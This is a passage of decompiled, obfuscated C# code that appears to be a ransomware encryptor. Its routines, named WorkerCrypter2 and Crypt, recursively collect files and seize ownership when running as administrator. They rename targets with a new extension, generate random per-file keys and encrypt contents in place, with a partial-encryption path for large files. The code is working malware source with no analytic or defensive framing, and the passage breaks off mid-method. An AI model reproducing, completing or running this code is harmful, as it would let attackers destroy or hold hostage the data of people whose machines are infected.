using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using LKDFotCmhcU;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using oFbodOYJTt;

namespace frgoWklvEOSV;

internal sealed class PFruJiQrcriiZ
{
	public sealed class RAjgPCVHZF
	{
		private static StringCollection rKTaPFzOWa;

		private static List<string> KgTnddVGDKK;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107403605));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107403600)) && !text.ToLower().Contains(getString_0(107403579)) && !text.ToLower().Contains(getString_0(107388874)) && !text.ToLower().Contains(getString_0(107388829)) && !text.ToLower().Contains(getString_0(107403598)) && !text.ToLower().Contains(getString_0(107388201)) && !text.ToLower().Contains(getString_0(107388142)) && !text.ToLower().Contains(getString_0(107388093)) && !text.ToLower().Contains(getString_0(107388108)) && !text.ToLower().Contains(getString_0(107388059)) && !text.ToLower().Contains(getString_0(107388025)) && !text.ToLower().Contains(getString_0(107388040)) && !text.ToLower().Contains(getString_0(107388503)) && !text.ToLower().Contains(getString_0(107388522)) && !text.ToLower().Contains(getString_0(107388469)) && !text.ToLower().Contains(getString_0(107388488)) && !text.ToLower().Contains(getString_0(107388443)) && !text.ToLower().Contains(getString_0(107388458)) && !text.ToLower().Contains(getString_0(107388409)) && !text.Contains(GwTsezEgVAuVAU(getString_0(107388424))) && !text.Contains(getString_0(107388399)) && !text.Contains(getString_0(107388386)) && !text.EndsWith(getString_0(107395438)) && !text.EndsWith(getString_0(107388361)) && !text.EndsWith(getString_0(107388356)) && !text.EndsWith(getString_0(107388319)) && !text.EndsWith(getString_0(107388314)) && !text.ToLower().Contains(getString_0(107388309)) && !text.ToLower().Contains(LIbWxYpDOmPy))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(cJvZgRMCiiT) * 1024.0 * 1024.0 && kvJFoDYMuC == getString_0(107396858))
							{
								KgTnddVGDKK.Add(text);
							}
							else if (File.Exists(text) && kvJFoDYMuC == getString_0(107397018))
							{
								KgTnddVGDKK.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return KgTnddVGDKK;
		}

		static RAjgPCVHZF()
		{
			Strings.CreateGetStringDelegate(typeof(RAjgPCVHZF));
			rKTaPFzOWa = new StringCollection();
			KgTnddVGDKK = new List<string>();
		}
	}

	private sealed class dkdfdmXmxAk
	{
		public string sZxLlvESUzLZXKq;

		public bool _003CMain_003Eb__6(Process process_0)
		{
			return process_0.ProcessName == sZxLlvESUzLZXKq;
		}
	}

	private sealed class OjfhzFWYFdyA
	{
		public string[] JNtjaLfncUVSAvQ;

		public void _003CMain_003Eb__7()
		{
			PmZcbpYMQkkuHdO.xRTdqUJOGhXP(JNtjaLfncUVSAvQ);
		}
	}

	private sealed class qZMjyZfSuemhC
	{
		private sealed class DCzjcOwiJDl
		{
			public qZMjyZfSuemhC APrnMdZiEm;

			public string NyPtOimZdkEdllM;

			public void _003CCrypt_003Eb__23()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					BDTFnPeiNCX(WindowsIdentity.GetCurrent().Name, NyPtOimZdkEdllM);
				}
			}

			public void _003CCrypt_003Eb__24()
			{
				HGTRyKvTZjusOL(NyPtOimZdkEdllM, APrnMdZiEm.gEhXXIzChk, APrnMdZiEm.sZqoWBfJdvFIl, APrnMdZiEm.WLgJdVMBruB, APrnMdZiEm.wxfrhJHvjWjHlu);
			}
		}

		public string[] gEhXXIzChk;

		public string[] WLgJdVMBruB;

		public string wxfrhJHvjWjHlu;

		public string sZqoWBfJdvFIl;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__22(string string_0)
		{
			DCzjcOwiJDl CS_0024_003C_003E8__locals0 = new DCzjcOwiJDl();
			CS_0024_003C_003E8__locals0.APrnMdZiEm = this;
			CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM = string_0;
			if (upflSQRmeWP && !PAhtGWwudbxozQK().Contains(getString_0(107386888)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						BDTFnPeiNCX(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (iEHeKlEPYHGI == getString_0(107396865))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					HGTRyKvTZjusOL(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, CS_0024_003C_003E8__locals0.APrnMdZiEm.gEhXXIzChk, CS_0024_003C_003E8__locals0.APrnMdZiEm.sZqoWBfJdvFIl, CS_0024_003C_003E8__locals0.APrnMdZiEm.WLgJdVMBruB, CS_0024_003C_003E8__locals0.APrnMdZiEm.wxfrhJHvjWjHlu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				HGTRyKvTZjusOL(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, gEhXXIzChk, sZqoWBfJdvFIl, WLgJdVMBruB, wxfrhJHvjWjHlu);
			}
		}

		static qZMjyZfSuemhC()
		{
			Strings.CreateGetStringDelegate(typeof(qZMjyZfSuemhC));
		}
	}

	private sealed class kFfBlUyayStE
	{
		private sealed class knpMjkNPiIY
		{
			public kFfBlUyayStE JhmFrwpsOrTq;

			public string JqgYVVMwzVoNzX;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				foreach (string item in EKjYgfCTgvyfhvOPx)
				{
					if (JqgYVVMwzVoNzX.ToLower().EndsWith(item + JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == getString_0(107396876))
					{
						if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(JqgYVVMwzVoNzX).Length)
						{
							try
							{
								GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389341), getString_0(107389336), getString_0(107388779), JqgYVVMwzVoNzX);
							}
							catch
							{
							}
						}
					}
					else if (JqgYVVMwzVoNzX.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107397036))
					{
						try
						{
							GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389341), getString_0(107389336), getString_0(107388779), JqgYVVMwzVoNzX);
						}
						catch
						{
						}
					}
				}
			}

			static knpMjkNPiIY()
			{
				Strings.CreateGetStringDelegate(typeof(knpMjkNPiIY));
			}
		}

		private sealed class YUIjdATTEVIX
		{
			public kFfBlUyayStE JhmFrwpsOrTq;

			public string PUDDzPYRoE;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__32()
			{
				foreach (string item in EKjYgfCTgvyfhvOPx)
				{
					if (PUDDzPYRoE.ToLower().EndsWith(item + JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == getString_0(107396879))
					{
						if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(PUDDzPYRoE).Length)
						{
							try
							{
								GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389344), getString_0(107389339), getString_0(107388782), PUDDzPYRoE);
							}
							catch
							{
							}
						}
					}
					else if (PUDDzPYRoE.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107397039))
					{
						try
						{
							GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389344), getString_0(107389339), getString_0(107388782), PUDDzPYRoE);
						}
						catch
						{
						}
					}
				}
			}

			static YUIjdATTEVIX()
			{
				Strings.CreateGetStringDelegate(typeof(YUIjdATTEVIX));
			}
		}

		public List<string> ZfHQdOmNHVP;

		public List<string> WNvdcTPDgW;

		public string ZDxRrpKTbd;

		public string[] dXgeOiXUaNyFEW;

		public string nyAmnOdcSzzfJ;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2f(string string_0)
		{
			knpMjkNPiIY CS_0024_003C_003E8__locals0;
			foreach (string item in WNvdcTPDgW)
			{
				if (dXgeOiXUaNyFEW.Length != 0)
				{
					string[] array = dXgeOiXUaNyFEW;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09e1;
					}
				}
				try
				{
					if (item.EndsWith(ZDxRrpKTbd))
					{
						goto IL_09e1;
					}
				}
				catch (Exception)
				{
					goto IL_09e1;
				}
				if (!item.EndsWith(string_0) || yGkMwQPqUdXIj.Contains(item))
				{
					continue;
				}
				if (cySCSfjuDKIn == getString_0(107396873))
				{
					try
					{
						if (NqaDDCCMEbCxV.SmlSZjnRIeVP(item))
						{
							NqaDDCCMEbCxV.XkoarExxofRiBeK(item);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(item);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(item)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(item));
				}
				VmNlRJHbsFKpwZ(item);
				try
				{
					new vyQYEsUfMyGoFM().rjhwntJsrm(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qoRjYABduZF)
							{
								Console.WriteLine(getString_0(107403564) + item + getString_0(107403519) + new FileInfo(item).Length + getString_0(107403498));
								Console.WriteLine(getString_0(107403489));
							}
						}
						catch
						{
						}
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107403416)), getString_0(107387760) + item + getString_0(107387760) + GwTsezEgVAuVAU(getString_0(107403871)) + getString_0(107387760) + Environment.UserName + getString_0(107387760) + GwTsezEgVAuVAU(getString_0(107403854)));
					}
				}
				catch (Exception ex2)
				{
					if (joesCNAxeHUI)
					{
						try
						{
							File.AppendAllText(jnRLNtXuRRg, getString_0(107386518) + item + getString_0(107403861) + ex2.Message + getString_0(107396306));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (joesCNAxeHUI)
						{
							try
							{
								File.AppendAllText(jnRLNtXuRRg, getString_0(107386518) + item + getString_0(107403748) + ex4.Message + getString_0(107396306));
							}
							catch (Exception)
							{
							}
						}
						iePhSHBTqLd++;
						goto end_IL_02cd;
					}
					if (CdQMIPJOkrOUDSy == getString_0(107396873) && new FileInfo(item).Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024 && !ZfHQdOmNHVP.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new knpMjkNPiIY();
						CS_0024_003C_003E8__locals0.JhmFrwpsOrTq = this;
						try
						{
							if (ZDxRrpKTbd != getString_0(107386778))
							{
								if (MiZHZrKmtKkaPXn)
								{
									ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
								}
								File.Move(item, item + ZDxRrpKTbd);
							}
						}
						catch (Exception ex6)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, getString_0(107386518) + item + getString_0(107403687) + ex6.Message + getString_0(107396306));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = getString_0(107388713);
						if (ZDxRrpKTbd != getString_0(107386778))
						{
							CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item + ZDxRrpKTbd;
						}
						else
						{
							CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item;
						}
						if (bxhZXFvKXZl == getString_0(107396873))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in EKjYgfCTgvyfhvOPx)
								{
									if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == knpMjkNPiIY.getString_0(107396876))
									{
										if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX).Length)
										{
											try
											{
												GyWbmViNanxKl.DGdOiIgzOMW(knpMjkNPiIY.getString_0(107389341), knpMjkNPiIY.getString_0(107389336), knpMjkNPiIY.getString_0(107388779), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2) && vEWBFQaTPDgk == knpMjkNPiIY.getString_0(107397036))
									{
										try
										{
											GyWbmViNanxKl.DGdOiIgzOMW(knpMjkNPiIY.getString_0(107389341), knpMjkNPiIY.getString_0(107389336), knpMjkNPiIY.getString_0(107388779), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = AnLYutpDjmCX.cVQEpGjgoi(32);
						string s = FlpXYRWvTX.ZTvekdOmyg(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QGAYpwMzxm == getString_0(107397033))
						{
							byte[] array2 = null;
							byte[] byte_ = fkozHCDTDrY.OlBXyEPnCYpDO(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
							if (fkozHCDTDrY.wXhdORmUgbGuB(quwoLGzcjeGYg: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? fkozHCDTDrY.GVHcoGquozRzL(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fkozHCDTDrY.GVHcoGquozRzL(byte_, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? RpWKlAyYXuFg.pUQagweWpoRi(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RpWKlAyYXuFg.pUQagweWpoRi(byte_, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZsIFKCtaED: CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, TTsauZziAEbN: bytes))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + ZDxRrpKTbd, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!IooTTsvIiwCN)
						{
							if (dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, nyAmnOdcSzzfJ))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + ZDxRrpKTbd, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, text, bytes))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + ZDxRrpKTbd, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (MiZHZrKmtKkaPXn)
					{
						ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
					}
					string text2 = AnLYutpDjmCX.cVQEpGjgoi(32);
					string s2 = FlpXYRWvTX.ZTvekdOmyg(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (ZDxRrpKTbd != getString_0(107386778))
					{
						if (!EcdpqbMrQOzfdgL)
						{
							if (!IooTTsvIiwCN)
							{
								GKkFnjoUAoXGqN(item, item + ZDxRrpKTbd, lrVhqMPbYlaOK);
							}
							else
							{
								GKkFnjoUAoXGqN(item, item + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IooTTsvIiwCN)
								{
									IzvDPVDWsNMZj(item, item + ZDxRrpKTbd, lrVhqMPbYlaOK);
								}
								else
								{
									IzvDPVDWsNMZj(item, item + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, getString_0(107386518) + item + getString_0(107386220) + ex11.Message + getString_0(107396306));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								try
								{
									File.Move(item + ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!EcdpqbMrQOzfdgL)
					{
						if (!IooTTsvIiwCN)
						{
							GKkFnjoUAoXGqN(item, item + getString_0(107386773), lrVhqMPbYlaOK);
						}
						else
						{
							GKkFnjoUAoXGqN(item, item + getString_0(107386773), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!IooTTsvIiwCN)
							{
								IzvDPVDWsNMZj(item, item, lrVhqMPbYlaOK);
							}
							else
							{
								IzvDPVDWsNMZj(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, getString_0(107386518) + item + getString_0(107386220) + ex14.Message + getString_0(107396306));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							goto end_IL_02cd;
						}
					}
					if (IooTTsvIiwCN)
					{
						if (ZDxRrpKTbd != getString_0(107386778))
						{
							KGSDHYAAGYu(item + ZDxRrpKTbd, bytes2);
						}
						else
						{
							KGSDHYAAGYu(item, bytes2);
						}
					}
					goto IL_09e1;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_09e1;
				}
				continue;
				IL_09e1:
				WNvdcTPDgW.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__31(string string_0)
		{
			YUIjdATTEVIX CS_0024_003C_003E8__locals0 = new YUIjdATTEVIX();
			CS_0024_003C_003E8__locals0.JhmFrwpsOrTq = this;
			CS_0024_003C_003E8__locals0.PUDDzPYRoE = string_0;
			if (dXgeOiXUaNyFEW.Length != 0)
			{
				string[] array = dXgeOiXUaNyFEW;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac1;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(ZDxRrpKTbd))
				{
					goto IL_0ac1;
				}
			}
			catch (Exception)
			{
				goto IL_0ac1;
			}
			if (!yGkMwQPqUdXIj.Contains(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
			{
				if (cySCSfjuDKIn == getString_0(107396873))
				{
					try
					{
						if (NqaDDCCMEbCxV.SmlSZjnRIeVP(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
						{
							NqaDDCCMEbCxV.XkoarExxofRiBeK(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE));
				}
				VmNlRJHbsFKpwZ(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				try
				{
					new vyQYEsUfMyGoFM().rjhwntJsrm(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.PUDDzPYRoE, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qoRjYABduZF)
							{
								Console.WriteLine(getString_0(107403564) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107403519) + new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length + getString_0(107403498));
								Console.WriteLine(getString_0(107403489));
							}
						}
						catch
						{
						}
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107403416)), getString_0(107387760) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107387760) + GwTsezEgVAuVAU(getString_0(107403871)) + getString_0(107387760) + Environment.UserName + getString_0(107387760) + GwTsezEgVAuVAU(getString_0(107403854)));
					}
				}
				catch (Exception ex2)
				{
					if (joesCNAxeHUI)
					{
						try
						{
							File.AppendAllText(jnRLNtXuRRg, getString_0(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107403861) + ex2.Message + getString_0(107396306));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (joesCNAxeHUI)
						{
							try
							{
								File.AppendAllText(jnRLNtXuRRg, getString_0(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107403748) + ex4.Message + getString_0(107396306));
							}
							catch (Exception)
							{
							}
						}
						iePhSHBTqLd++;
						goto end_IL_031d_2;
					}
					if (CdQMIPJOkrOUDSy == getString_0(107396873) && new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024)
					{
						try
						{
							if (ZDxRrpKTbd != getString_0(107386778))
							{
								if (MiZHZrKmtKkaPXn)
								{
									ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
								}
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd);
							}
						}
						catch (Exception ex6)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, getString_0(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107403687) + ex6.Message + getString_0(107396306));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							return;
						}
						if (ZDxRrpKTbd != getString_0(107386778))
						{
							CS_0024_003C_003E8__locals0.PUDDzPYRoE += ZDxRrpKTbd;
						}
						if (bxhZXFvKXZl == getString_0(107396873))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in EKjYgfCTgvyfhvOPx)
								{
									if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == YUIjdATTEVIX.getString_0(107396879))
									{
										if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length)
										{
											try
											{
												GyWbmViNanxKl.DGdOiIgzOMW(YUIjdATTEVIX.getString_0(107389344), YUIjdATTEVIX.getString_0(107389339), YUIjdATTEVIX.getString_0(107388782), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item) && vEWBFQaTPDgk == YUIjdATTEVIX.getString_0(107397039))
									{
										try
										{
											GyWbmViNanxKl.DGdOiIgzOMW(YUIjdATTEVIX.getString_0(107389344), YUIjdATTEVIX.getString_0(107389339), YUIjdATTEVIX.getString_0(107388782), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = AnLYutpDjmCX.cVQEpGjgoi(32);
						string s = FlpXYRWvTX.ZTvekdOmyg(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QGAYpwMzxm == getString_0(107397033))
						{
							byte[] array2 = null;
							byte[] byte_ = fkozHCDTDrY.OlBXyEPnCYpDO(CS_0024_003C_003E8__locals0.PUDDzPYRoE, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
							if (!fkozHCDTDrY.wXhdORmUgbGuB(quwoLGzcjeGYg: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? fkozHCDTDrY.GVHcoGquozRzL(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fkozHCDTDrY.GVHcoGquozRzL(byte_, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? RpWKlAyYXuFg.pUQagweWpoRi(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RpWKlAyYXuFg.pUQagweWpoRi(byte_, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZsIFKCtaED: CS_0024_003C_003E8__locals0.PUDDzPYRoE, TTsauZziAEbN: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!IooTTsvIiwCN)
						{
							if (!dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, nyAmnOdcSzzfJ))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (MiZHZrKmtKkaPXn)
						{
							ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
						}
						string text2 = AnLYutpDjmCX.cVQEpGjgoi(32);
						string s2 = FlpXYRWvTX.ZTvekdOmyg(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (ZDxRrpKTbd != getString_0(107386778))
						{
							if (!EcdpqbMrQOzfdgL)
							{
								if (!IooTTsvIiwCN)
								{
									GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, lrVhqMPbYlaOK);
								}
								else
								{
									GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!IooTTsvIiwCN)
									{
										IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, lrVhqMPbYlaOK);
									}
									else
									{
										IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (joesCNAxeHUI)
									{
										try
										{
											File.AppendAllText(jnRLNtXuRRg, getString_0(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107386220) + ex11.Message + getString_0(107396306));
										}
										catch (Exception)
										{
										}
									}
									iePhSHBTqLd++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!EcdpqbMrQOzfdgL)
						{
							if (!IooTTsvIiwCN)
							{
								GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107386773), lrVhqMPbYlaOK);
							}
							else
							{
